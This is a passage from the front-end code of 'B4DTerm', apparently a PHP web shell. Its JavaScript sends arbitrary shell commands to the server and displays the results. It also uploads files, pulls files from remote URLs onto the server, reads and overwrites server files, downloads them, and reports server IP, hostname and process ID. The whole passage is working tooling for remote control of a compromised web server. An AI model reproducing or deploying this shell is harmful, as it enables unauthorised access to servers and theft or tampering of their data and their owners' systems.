        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showToast('PHP information copied to clipboard', 'success');
    }
};

// ================ MODAL FUNCTIONS ================
const openUploadModal = () => {
    document.getElementById('uploadModal').classList.remove('hidden');
    document.getElementById('uploadFileInput').value = '';
};

const closeUploadModal = () => {
    document.getElementById('uploadModal').classList.add('hidden');
    document.getElementById('uploadFileInput').value = '';
};

const uploadFile = async () => {
    const fileInput = document.getElementById('uploadFileInput');
    const file = fileInput.files[0];
    
    if(!file) {
        showToast('Select file first!', 'warning');
        return;
    }
    
    if (file.size > 10 * 1024 * 1024) {
        showToast('File too large! Maximum 10MB', 'error');
        return;
    }
    
    const formData = new FormData(); 
    formData.append('upload_data', file);
    
    closeUploadModal();
    showToast(`Uploading ${file.name}...`, 'info');
    
    try {
        const response = await fetch('',{
            method:'POST',
            body:formData,
            signal: AbortSignal.timeout(30000)
        }).then(res=>res.json());
        
        if (response.status && response.path) {
            showToast(`✓ Upload successful: ${file.name}`, 'success');
            execute('ls -la');
        } else {
            showToast('✗ Upload failed. Check permissions or disk space.', 'error');
        }
    } catch(e) {
        if (e.name === 'AbortError') {
            showToast('⏱️ Upload timeout (30 seconds)', 'error');
        } else {
            showToast(`✗ Upload error: ${e.message}`, 'error');
        }
    }
};

const openUrlUploadModal = () => {
    closeUploadModal();
    document.getElementById('urlUploadModal').classList.remove('hidden');
    document.getElementById('urlInput').focus();
};

const closeUrlUploadModal = () => {
    document.getElementById('urlUploadModal').classList.add('hidden');
    document.getElementById('urlInput').value = '';
    document.getElementById('urlFilename').value = '';
};

const startUrlUpload = async () => {
    const url = document.getElementById('urlInput').value.trim();
    const filename = document.getElementById('urlFilename').value.trim();
    
    if (!url) {
        showToast('URL required!', 'warning');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('remote_fetch', '1');
        formData.append('url', url);
        if (filename) {
            formData.append('remote_filename', filename);
        }
        
        showToast(`Downloading from URL...`, 'info');
        closeUrlUploadModal();
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status) {
            showToast(`✓ Download successful: ${result.size} bytes`, 'success');
            execute('ls -la');
        } else {
            showToast(`✗ Download failed: ${result.message}`, 'error');
        }
    } catch (error) {
        showToast('✗ Error downloading from URL', 'error');
    }
};

const showIpInfo = async () => {
    document.getElementById('ipModal').classList.remove('hidden');
    
    try {
        const formData = new FormData();
        formData.append('network_info', '1');
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status) {
            document.getElementById('clientIp').textContent = result.client || 'Not available';
            document.getElementById('serverIp').textContent = result.server || 'Not available';
            document.getElementById('hostname').textContent = result.hostname || 'Not available';
        } else {
            document.getElementById('clientIp').textContent = 'Error loading';
            document.getElementById('serverIp').textContent = 'Error loading';
            document.getElementById('hostname').textContent = 'Error loading';
        }
    } catch (error) {
        document.getElementById('clientIp').textContent = 'Network error';
        document.getElementById('serverIp').textContent = 'Network error';
        document.getElementById('hostname').textContent = 'Network error';
    }
};

const closeIpModal = () => {
    document.getElementById('ipModal').classList.add('hidden');
};

// ================ COMPRESS FUNCTIONS ================
const openCompressModal = () => {
    document.getElementById('compressModal').classList.remove('hidden');
    document.getElementById('compressTarget').value = '';
    document.getElementById('archiveName').value = '';
    
    // Reset status
    const statusDiv = document.getElementById('compressStatus');
    if (statusDiv) {
        statusDiv.innerHTML = '';
        statusDiv.classList.add('hidden');
    }
};

const closeCompressModal = () => {
    document.getElementById('compressModal').classList.add('hidden');
    document.getElementById('compressTarget').value = '';
    document.getElementById('archiveName').value = '';
};

const selectForCompress = (target, isDir) => {
    document.getElementById('compressTarget').value = target;
    const defaultExt = isDir ? '.zip' : '.zip';
    document.getElementById('archiveName').value = target + defaultExt;
    document.getElementById('archiveName').focus();
    document.getElementById('archiveName').select();
};

const showExtractProgress = (message, type = 'info') => {
    const statusDiv = document.getElementById('compressStatus');
    if (!statusDiv) return;
    
    statusDiv.className = `mt-3 text-xs p-2 rounded ${
        type === 'info' ? 'bg-blue-900/20 text-blue-300 border border-blue-500/30' :
        type === 'success' ? 'bg-green-900/20 text-green-300 border border-green-500/30' :
        type === 'error' ? 'bg-red-900/20 text-red-300 border border-red-500/30' :
        'bg-gray-900/20 text-gray-300 border border-gray-500/30'
    }`;
    statusDiv.innerHTML = `<i class="fas fa-${type === 'info' ? 'info-circle' : type === 'success' ? 'check-circle' : 'exclamation-circle'} mr-2"></i>${message}`;
    statusDiv.classList.remove('hidden');
};

const validateAndExtract = async (action) => {
    const target = document.getElementById('compressTarget').value.trim();
    
    if (!target) {
        showToast('Please select a target first', 'warning');
        return false;
    }
    
    // Validasi khusus untuk unzip
    if (action === 'unzip') {
        if (!target.toLowerCase().endsWith('.zip')) {
            showToast('Please select a .zip file for extraction', 'warning');
            return false;
        }
    }
    
    // Validasi khusus untuk untar
    if (action === 'untar') {
        if (!target.toLowerCase().endsWith('.tar.gz') && 
            !target.toLowerCase().endsWith('.tgz') &&
            !target.toLowerCase().endsWith('.tar')) {
            showToast('Please select a .tar.gz, .tgz or .tar file for extraction', 'warning');
            return false;
        }
    }
    
    return true;
};

const compressAction = async (action) => {
    const target = document.getElementById('compressTarget').value.trim();
    const archiveName = document.getElementById('archiveName').value.trim();
    
    // Validasi sebelum melanjutkan
    if (!await validateAndExtract(action)) {
        return;
    }
    
    // Untuk extract, jika archiveName kosong, gunakan nama file tanpa ekstensi
    if ((action === 'unzip' || action === 'untar') && !archiveName) {
        const fileName = target.replace(/\.[^/.]+$/, ""); // Hapus ekstensi
        document.getElementById('archiveName').value = fileName;
    }
    
    try {
        const formData = new FormData();
        formData.append('compress_action', action);
        formData.append('compress_target', target);
        formData.append('archive_name', archiveName);
        
        showExtractProgress(action === 'zip' || action === 'tar' ? 'Compressing...' : 'Extracting...', 'info');
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status) {
            showExtractProgress(`✓ ${result.message}`, 'success');
            
            // Tampilkan informasi tambahan jika ada
            if (result.file_count) {
                setTimeout(() => {
                    showToast(`Extracted ${result.file_count} files`, 'info');
                }, 500);
            }
            
            // Refresh file list setelah beberapa detik
            setTimeout(() => {
                closeCompressModal();
                execute('ls -la');
            }, 1500);
        } else {
            showExtractProgress(`✗ ${result.message}`, 'error');
        }
    } catch (error) {
        showExtractProgress('✗ Error during operation: ' + error.message, 'error');
    }
};

// ================ HISTORY FUNCTIONS ================
const openHistoryModal = () => {
    document.getElementById('historyModal').classList.remove('hidden');
    displayHistoryList();
};

const closeHistoryModal = () => {
    document.getElementById('historyModal').classList.add('hidden');
};

const displayHistoryList = () => {
    const historyList = document.getElementById('historyList');
    historyList.innerHTML = '';
    
    if (commandHistory.length === 0) {
        historyList.innerHTML = '<div class="text-gray-500 text-sm text-center py-8">No command history yet</div>';
        return;
    }
    
    // Tampilkan dari yang terbaru
    [...commandHistory].reverse().forEach((cmd, index) => {
        const realIndex = commandHistory.length - index - 1;
        const item = document.createElement('div');
        item.className = 'flex items-center justify-between p-3 bg-neutral-900/50 rounded border border-indigo-500/20 hover:bg-neutral-800 transition-colors';
        item.innerHTML = `
            <div class="flex-1 min-w-0">
                <div class="text-gray-300 text-xs font-mono break-all">${escapeHtml(cmd)}</div>
                <div class="text-gray-500 text-[10px] mt-1 flex items-center gap-2">
                    <span>#${realIndex + 1}</span>
                </div>
            </div>
            <div class="flex gap-2 ml-2 flex-shrink-0">
                <button onclick="executeFromHistory('${escapeSingleQuotes(cmd)}')" class="text-indigo-400 hover:text-indigo-300 text-xs px-2 py-1 border border-indigo-500/30 rounded" title="Execute">
                    <i class="fas fa-play"></i>
                </button>
                <button onclick="copyToClipboard('${escapeSingleQuotes(cmd)}')" class="text-gray-400 hover:text-gray-300 text-xs px-2 py-1 border border-gray-500/30 rounded" title="Copy">
                    <i class="fas fa-copy"></i>
                </button>
            </div>
        `;
        historyList.appendChild(item);
    });
};

const executeFromHistory = (command) => {
    closeHistoryModal();
    input_field.value = command;
    execute();
};

const clearHistory = () => {
    if (commandHistory.length === 0) {
        showToast('History is already empty', 'info');
        return;
    }
    
    if (confirm(`Clear all ${commandHistory.length} commands from history?`)) {
        commandHistory = [];
        historyIndex = -1;
        saveHistoryToStorage();
        displayHistoryList();
        showToast('History cleared', 'success');
    }
};

const exportHistory = () => {
    if (commandHistory.length === 0) {
        showToast('No history to export', 'info');
        return;
    }
    
    const historyText = commandHistory.map((cmd, idx) => `${idx + 1}. ${cmd}`).join('\n');
    const blob = new Blob([`B4DTerm Command History\nGenerated: ${new Date().toLocaleString()}\n\n${historyText}`], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `b4dterm-history-${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`Exported ${commandHistory.length} commands`, 'success');
};

const saveHistoryToStorage = () => {
    try {
        localStorage.setItem('b4dterm_history', JSON.stringify(commandHistory.slice(-100)));
    } catch (e) {
        console.log('LocalStorage not available');
    }
};

// ================ AUTO COMPLETE FUNCTIONS ================
const updateAutocomplete = () => {
    const input = input_field.value.trim();
    autocomplete_suggestions.innerHTML = '';
    autocomplete_suggestions.classList.add('hidden');
    currentSuggestions = [];
    autocompleteIndex = -1;
    
    if (input.length < 1) return;
    
    // Cari file/folder di direktori saat ini
    const fileSuggestions = <?php echo json_encode(array_map(function($item) {
        return ['name' => $item['name'], 'is_dir' => $item['is_dir']];
    }, $directory_contents)); ?>;
    
    // Filter command database
    const commandMatches = commandDatabase.filter(item => 
        item.cmd.toLowerCase().includes(input.toLowerCase()) ||
        input.toLowerCase().includes(item.cmd.toLowerCase().split(' ')[0])
    );
    
    // Filter file matches
    const fileMatches = fileSuggestions.filter(item =>
        item.name.toLowerCase().includes(input.toLowerCase()) ||
        input.toLowerCase().includes(item.name.toLowerCase())
    ).slice(0, 10);
    
    // Gabungkan semua suggestion
    currentSuggestions = [
        ...commandMatches.slice(0, 8),
        ...fileMatches.map(file => ({
            cmd: file.name + (file.is_dir ? '/' : ''),
            desc: file.is_dir ? 'Directory' : 'File',
            type: file.is_dir ? 'folder' : 'file',
            icon: file.is_dir ? 'fa-folder' : 'fa-file'
        })).slice(0, 4)
    ];
    
    if (currentSuggestions.length === 0) return;
    
    // Tampilkan suggestions
    currentSuggestions.forEach((suggestion, index) => {
        const item = document.createElement('div');
        item.className = 'autocomplete-item';
        item.dataset.index = index;
        item.innerHTML = `
            <i class="fas ${suggestion.icon} ${getTypeColor(suggestion.type)} text-xs"></i>
            <span class="flex-1">${highlightMatch(suggestion.cmd, input)}</span>
            <span class="type">${suggestion.type}</span>
            ${suggestion.desc ? `<span class="shortcut">${suggestion.desc}</span>` : ''}
        `;
        
        item.addEventListener('click', () => selectAutocomplete(index));
        item.addEventListener('touchstart', (e) => {
            e.preventDefault();
            selectAutocomplete(index);
        }, { passive: false });
        
        autocomplete_suggestions.appendChild(item);
    });
    
    autocomplete_suggestions.classList.remove('hidden');
};

const selectAutocomplete = (index) => {
    if (index < 0 || index >= currentSuggestions.length) return;
    
    const suggestion = currentSuggestions[index];
    const currentInput = input_field.value;
    const words = currentInput.split(' ');
    
    if (words.length === 1 || suggestion.type === 'command') {
        input_field.value = suggestion.cmd + (suggestion.cmd.endsWith(' ') ? '' : ' ');
    } else {
        words[words.length - 1] = suggestion.cmd;
        input_field.value = words.join(' ') + (suggestion.type === 'folder' ? '/' : ' ');
    }
    
    input_field.focus();
    autocomplete_suggestions.classList.add('hidden');
    currentSuggestions = [];
    
    if (window.innerWidth < 768) {
        setTimeout(() => {
            input_field.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 100);
    }
};

const highlightMatch = (text, search) => {
    if (!search) return escapeHtml(text);
    const regex = new RegExp(`(${escapeRegex(search)})`, 'gi');
    return escapeHtml(text).replace(regex, '<span class="text-emerald-400 font-bold">$1</span>');
};

const getTypeColor = (type) => {
    const colors = {
        command: 'text-blue-400',
        info: 'text-green-400',
        network: 'text-cyan-400',
        search: 'text-yellow-400',
        archive: 'text-orange-400',
        help: 'text-purple-400',
        danger: 'text-red-400',
        warning: 'text-yellow-500',
        file: 'text-gray-400',
        folder: 'text-yellow-400'
    };
    return colors[type] || 'text-gray-400';
};

// ================ UTILITY FUNCTIONS ================
const escapeHtml = (text) => {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
};

const escapeSingleQuotes = (text) => {
    return text.replace(/'/g, "\\'").replace(/"/g, '&quot;');
};

const escapeRegex = (string) => {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
};

const copyToClipboard = async (text) => {
    try {
        await navigator.clipboard.writeText(text);
        showToast('Copied to clipboard', 'success');
    } catch (err) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showToast('Copied to clipboard', 'success');
    }
};

// TOAST NOTIFICATION - VISIBLE!
const showToast = (message, type = 'info') => {
    const colors = {
        info: 'border-emerald-500/40 bg-emerald-900/20 text-emerald-300',
        success: 'border-green-500/40 bg-green-900/20 text-green-300',
        warning: 'border-yellow-500/40 bg-yellow-900/20 text-yellow-300',
        error: 'border-red-500/40 bg-red-900/20 text-red-300'
    };
    
    // Hapus toast sebelumnya jika ada
    const existingToast = document.querySelector('.toast-notification');
    if (existingToast) {
        existingToast.remove();
    }
    
    const toast = document.createElement('div');
    toast.className = `toast-notification ${colors[type] || colors.info}`;
    toast.innerHTML = `
        <div class="flex items-center justify-center gap-2">
            <i class="fas ${getToastIcon(type)}"></i>
            <span>${message}</span>
        </div>
    `;
    document.body.appendChild(toast);
    
    // Auto remove setelah 3 detik
    setTimeout(() => {
        if (toast.parentNode) {
            toast.style.animation = 'fadeOut 0.3s ease forwards';
            setTimeout(() => toast.remove(), 300);
        }
    }, 2700);
};

const getToastIcon = (type) => {
    const icons = {
        info: 'fa-info-circle',
        success: 'fa-check-circle',
        warning: 'fa-exclamation-triangle',
        error: 'fa-times-circle'
    };
    return icons[type] || 'fa-info-circle';
};

// ================ CORE FUNCTIONS ================
const typeWriter = (text, element, callback, speed = 25) => {
    let i = 0;
    element.innerHTML = '';
    function type() {
        if (i < text.length) {
            element.innerHTML += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else if (callback) {
            callback();
        }
    }
    type();
};

const animateLoad = () => {
    typeWriter("Connecting to system...", status_display, () => {
        status_display.innerHTML = 'Connecting to system... [ <span class="text-white">OK</span> ]';
        const d2 = document.createElement('div');
        d2.className = 'text-emerald-500 font-semibold text-xs mb-4 mt-2';
        output_area.appendChild(d2);
        typeWriter(`B4DTerm V2.1 Enhanced`, d2, () => {
            input_field.focus();
            showToast('Auto Complete enabled! Type and press TAB', 'info');
        }, 30);
    }, 40);
};

const logMessage = (text, isCommand = 0, isError = 0, type = 'normal') => {
    const container = document.createElement('div');
    if(isCommand){
        container.innerHTML = `<div class="text-[10px] text-gray-600 mt-2">system@terminal.host</div><div class="flex gap-2"><span class="text-emerald-500">$</span><span class="text-white">${escapeHtml(text)}</span></div>`;
    } else {
        container.className = `pl-3 border-l-2 ${isError?'border-red-500 text-red-400':'border-white/20 text-gray-300'} whitespace-pre overflow-x-auto py-1 text-[11px] leading-snug`;
        container.innerText = text;
    }
    output_area.appendChild(container);
    output_area.scrollTop = output_area.scrollHeight;
};

const execute = async(command) => {
    if(!command) command = input_field.value; 
    if(!command.trim()) return;
    
    command = command.trim();
    
    if (command !== 'clear' && command !== 'help' && !command.startsWith('dl ') && commandHistory[commandHistory.length - 1] !== command) {
        commandHistory.push(command);
        saveHistoryToStorage();
    }
    historyIndex = commandHistory.length;
    
    if(command == 'clear'){ 
        output_area.innerHTML=''; 
        logMessage('Process ID: <?= getmypid() ?>',0,0,'pid'); 
        animateLoad(); 
        input_field.value=''; 
        return; 
    }
    if (command === 'help') {
        logMessage(command, 1);
        logMessage(helpContent, 0, 0); 
        input_field.value = ''; 
        input_field.focus(); 
        return;
    }
    if(command.startsWith('dl ')){ 
        const file = command.substring(3);
        const saveAs = prompt('Save as (optional):', file);
        if (saveAs !== null) {
            window.location = `?fetch=${encodeURIComponent(file)}&saveas=${encodeURIComponent(saveAs || file)}`;
        }
        input_field.value=''; 
        return; 
    }
    
    logMessage(command,1); 
    input_field.value=''; 
    input_field.disabled=true;
    
    try {
        const formData = new FormData(); 
        formData.append('command',command);
        const response = await fetch('',{method:'POST',body:formData}).then(res=>res.json());
        
        if(response.output && response.output.trim() !== '') {
            logMessage(response.output,0,response.error);
        } else if (response.success && !response.error) {
            logMessage("Command executed successfully (no output)", 0, 0);
        } else if (response.error) {
            logMessage("Command execution failed", 0, 1);
        } else {
            logMessage("No output from command", 0, 0);
        }

        if(response.path && path_display) {
            path_display.innerHTML = response.path.split('/').map((part, index, parts) => {
                if (part === '') return '';
                let html = '';
                if (index > 0) {
                    html += '<span class="text-gray-600 mx-1"><i class="fas fa-chevron-right text-[8px]"></i></span>';
                }
                
                if (index === 0 && part === 'home') {
                    html += '<span class="text-emerald-300 hover:text-emerald-200 transition-colors flex items-center gap-1">';
                    html += '<i class="fas fa-home text-xs"></i>';
                    html += '<span>' + part + '</span>';
                    html += '</span>';
                } else {
                    html += '<span class="text-emerald-300 hover:text-emerald-200 transition-colors">' + part + '</span>';
                }
                return html;
            }).join('');
        }

        if (initialCommand && response.method && response.method !== 'disabled') {
            const methodDisplay = document.createElement('div');
            methodDisplay.className = 'text-emerald-500 text-[10px] pl-3 mb-2 font-semibold';
            output_area.appendChild(methodDisplay);
            typeWriter(`Execution Method: ${response.method} Activated`, methodDisplay);
            initialCommand = false;
        }

    } catch(e){ 
        logMessage('Request Failed: ' + e.message,0,1); 
    }
    input_field.disabled=false; 
    input_field.focus();
    
    autocomplete_suggestions.classList.add('hidden');
};

// ================ EVENT LISTENERS ================
document.getElementById('sb').onclick = () => execute();

input_field.addEventListener('input', (e) => {
    updateAutocomplete();
});

input_field.addEventListener('keydown', e => {
    if(e.key == 'Enter') {
        execute();
    }
    else if (e.key === 'Tab') {
        e.preventDefault();
        if (currentSuggestions.length > 0) {
            autocompleteIndex = (autocompleteIndex + 1) % currentSuggestions.length;
            selectAutocomplete(autocompleteIndex);
        }
    }
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (autocomplete_suggestions.classList.contains('hidden')) {
            if (historyIndex > 0) input_field.value = commandHistory[--historyIndex];
        } else {
            if (autocompleteIndex > 0) autocompleteIndex--;
            else autocompleteIndex = currentSuggestions.length - 1;
            updateAutocompleteSelection();
        }
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (autocomplete_suggestions.classList.contains('hidden')) {
            if (historyIndex < commandHistory.length - 1) input_field.value = commandHistory[++historyIndex];
            else { historyIndex = commandHistory.length; input_field.value = ''; }
        } else {
            if (autocompleteIndex < currentSuggestions.length - 1) autocompleteIndex++;
            else autocompleteIndex = 0;
            updateAutocompleteSelection();
        }
    }
    else if (e.key === 'Escape') {
        autocomplete_suggestions.classList.add('hidden');
        currentSuggestions = [];
    }
});

const updateAutocompleteSelection = () => {
    document.querySelectorAll('.autocomplete-item').forEach((item, index) => {
        item.classList.toggle('selected', index === autocompleteIndex);
        if (index === autocompleteIndex) {
            item.scrollIntoView({ block: 'nearest' });
        }
    });
};

document.addEventListener('click', (e) => {
    if (!autocomplete_suggestions.contains(e.target) && e.target !== input_field) {
        autocomplete_suggestions.classList.add('hidden');
    }
});

input_field.addEventListener('touchstart', (e) => {
    input_field.focus();
}, { passive: true });

// ================ INITIALIZATION ================
window.onload = () => {
    animateLoad();
    
    try {
        const saved = localStorage.getItem('b4dterm_history');
        if (saved) {
            commandHistory = JSON.parse(saved);
            historyIndex = commandHistory.length;
        }
    } catch (e) {
        console.log('Failed to load history from storage');
    }
    
    if (window.innerWidth < 768) {
        setTimeout(() => {
            input_field.focus();
            input_field.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 500);
    }
};

// Keep existing functions
const openCreateFolderModal = () => {
    document.getElementById('createFolderModal').classList.remove('hidden');
    document.getElementById('folderNameInput').value = 'new_folder';
    document.getElementById('folderNameInput').select();
    document.getElementById('folderNameInput').focus();
};

const closeCreateFolderModal = () => {
    document.getElementById('createFolderModal').classList.add('hidden');
    document.getElementById('folderNameInput').value = '';
};

const createFolderSubmit = () => {
    const folderName = document.getElementById('folderNameInput').value.trim();
    if (!folderName) {
        showToast('Folder name required!', 'warning');
        return;
    }
    closeCreateFolderModal();
    execute('mkdir ' + folderName);
};

const openCreateFileModal = () => {
    document.getElementById('createFileModal').classList.remove('hidden');
    document.getElementById('fileNameInput').value = 'new_file.txt';
    document.getElementById('fileNameInput').select();
    document.getElementById('fileNameInput').focus();
};

const closeCreateFileModal = () => {
    document.getElementById('createFileModal').classList.add('hidden');
    document.getElementById('fileNameInput').value = '';
    document.getElementById('fileContentInput').value = '';
};

const createFileSubmit = () => {
    const fileName = document.getElementById('fileNameInput').value.trim();
    if (!fileName) {
        showToast('File name required!', 'warning');
        return;
    }
    
    const content = document.getElementById('fileContentInput').value;
    closeCreateFileModal();
    
    execute('touch ' + fileName);
    
    if (content.trim() !== '') {
        setTimeout(() => {
            const formData = new FormData();
            formData.append('update_file', fileName);
            formData.append('data', content);
            
            fetch('', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(result => {
                  if (result.status) {
                      showToast(`File "${fileName}" created with content`, 'success');
                  }
              });
        }, 500);
    }
};

const openRenameModal = () => {
    document.getElementById('renameModal').classList.remove('hidden');
    document.getElementById('renameOldName').value = '';
    document.getElementById('renameNewName').value = '';
};

const closeRenameModal = () => {
    document.getElementById('renameModal').classList.add('hidden');
    document.getElementById('renameOldName').value = '';
    document.getElementById('renameNewName').value = '';
};

const selectFileForRename = (fileName) => {
    document.getElementById('renameOldName').value = fileName;
    document.getElementById('renameNewName').value = fileName;
    document.getElementById('renameNewName').select();
    document.getElementById('renameNewName').focus();
};

const renameSubmit = () => {
    const oldName = document.getElementById('renameOldName').value.trim();
    const newName = document.getElementById('renameNewName').value.trim();
    
    if (!oldName) {
        showToast('Select file/folder first!', 'warning');
        return;
    }
    
    if (!newName) {
        showToast('New name required!', 'warning');
        return;
    }
    
    if (oldName === newName) {
        showToast('New name must be different!', 'warning');
        return;
    }
    
    closeRenameModal();
    execute('mv "' + oldName + '" "' + newName + '"');
};

const openEditModal = () => {
    document.getElementById('editModal').classList.remove('hidden');
    document.getElementById('editFileName').value = '';
    document.getElementById('editFileContent').value = '';
};

const closeEditModal = () => {
    document.getElementById('editModal').classList.add('hidden');
    document.getElementById('editFileName').value = '';
    document.getElementById('editFileContent').value = '';
};

const selectFileForEdit = async (fileName) => {
    document.getElementById('editFileName').value = fileName;
    
    try {
        const formData = new FormData();
        formData.append('view_file', fileName);
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status) {
            document.getElementById('editFileContent').value = result.data;
            document.getElementById('editFileContent').focus();
        } else {
            showToast('Failed to read file: ' + (result.message || 'Unknown error'), 'error');
        }
    } catch (error) {
        showToast('Error reading file', 'error');
    }
};

const saveFile = async () => {
    const fileName = document.getElementById('editFileName').value.trim();
    const content = document.getElementById('editFileContent').value;
    
    if (!fileName) {
        showToast('Select file first!', 'warning');
        return;
    }

    try {
        const formData = new FormData();
        formData.append('update_file', fileName);
        formData.append('data', content);
        
        const response = await fetch('', {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (result.status) {
            showToast(`File "${fileName}" saved successfully`, 'success');
            closeEditModal();
        } else {
            showToast('Failed to save file: ' + (result.message || 'Unknown error'), 'error');
        }
    } catch (error) {
        showToast('Error saving file', 'error');
    }
};

const openDownloadModal = () => {
    document.getElementById('downloadModal').classList.remove('hidden');
    document.getElementById('downloadFile').focus();
};

const closeDownloadModal = () => {
    document.getElementById('downloadModal').classList.add('hidden');
    document.getElementById('downloadFile').value = '';
    document.getElementById('downloadAs').value = '';
};

const startCustomDownload = () => {
    const file = document.getElementById('downloadFile').value.trim();
    const saveAs = document.getElementById('downloadAs').value.trim();
    
    if (!file) {
        showToast('File name required!', 'warning');
        return;
    }
    
    const filename = saveAs || file;
    closeDownloadModal();
    window.location = `?fetch=${encodeURIComponent(file)}&saveas=${encodeURIComponent(filename)}`;
};

// Old upload toggle (for compatibility)
const toggleUpload = () => {
    document.getElementById('up').classList.toggle('hidden');
};

// Old upload handler (for compatibility)
document.getElementById('ub').onclick = async() => {
    const file = document.getElementById('fi').files[0];
    if(!file) {
        showToast('Select file first!', 'warning');
        return;
    }
    
    if (file.size > 10 * 1024 * 1024) {
        showToast('File too large! Maximum 10MB', 'error');
        return;
    }
    
    const formData = new FormData(); 
    formData.append('upload_data',file);
    
    const originalText = document.getElementById('ub').innerText;
    document.getElementById('ub').innerText = 'Uploading...';
    document.getElementById('ub').disabled = true;

    try {
        const response = await fetch('',{
            method:'POST',
            body:formData,
            signal: AbortSignal.timeout(30000)
        }).then(res=>res.json());
        
        if (response.status && response.path) {
            showToast(`Upload successful: ${file.name}`, 'success');
            execute('ls -la');
        } else {
            showToast('Upload failed. Check permissions or disk space.', 'error');
        }
    } catch(e) {
        if (e.name === 'AbortError') {
            showToast('Upload timeout (30 seconds)', 'error');
        } else {
            showToast('Upload error: ' + e.message, 'error');
        }
    } finally {
        document.getElementById('ub').innerText = originalText;
        document.getElementById('ub').disabled = false;
        document.getElementById('fi').value = '';
        toggleUpload();
    }
};
</script>

</body>
</html>